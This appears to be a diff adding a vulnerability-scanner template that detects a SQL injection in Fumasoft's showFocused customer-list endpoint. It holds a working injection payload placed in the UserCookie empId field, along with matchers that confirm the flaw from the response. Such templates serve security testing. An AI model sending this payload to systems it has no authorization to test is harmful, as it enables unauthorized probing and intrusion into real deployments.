@@ -1,0 +1,48 @@
+id: fumasoft-showfocused-sqli
+info:
+  name: Fumasoft showFocused SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: "{{rand_int(1000,10000)}}"
+  t2: "{{md5(t1)}}"
+
+flow: http(1) && http(2)
+
+http:
+  - id: check-homepage
+    method: GET
+    path:
+      - "{{BaseURL}}/"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "孚盟云"
+
+  - id: test-sqli
+    method: POST
+    path:
+      - "{{BaseURL}}/m/Dingding/Ajax/AjaxCustomerList.ashx"
+    headers:
+      Cookie: "UserCookie={\"empId\":\")-1/sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}'))--\"}"
+      Content-Type: application/x-www-form-urlencoded
+    body: "method=showFocused"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - "0x{{t2}}"
+          - "fnCheckEmpIsAdminUser"
+      - type: regex
+        regex:
+          - "转换成数据类型(.*?)时失败"
+          - "在将(.*?)值"
